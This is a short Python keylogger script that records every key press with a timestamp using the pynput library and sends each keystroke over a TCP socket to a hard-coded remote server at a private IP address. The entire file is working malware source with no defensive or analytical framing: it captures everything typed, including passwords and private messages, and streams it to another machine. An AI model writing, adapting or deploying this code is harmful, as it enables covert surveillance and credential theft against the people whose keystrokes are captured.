from pynput import keyboard
from datetime import datetime

import socket

host = '192.168.1.198' # The server's local IP address here (replace with 127.0.0.1 for localhost)
port = 55555

# Connecting to the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))

# Function to send the key logged to the server
def flush(msg):
    print(msg)
    # Encoding the string to binary format, and sending it
    # The string will be decoded on the server
    server.send(str(msg).encode())

def send(key):
    # Calling the function to send the key logged to the server
    flush(f"{datetime.now()}: Key {key} pressed")

# The keylogger itself
with keyboard.Listener(on_press=send) as listener: # Calls the send function when a key is pressed
    listener.join()
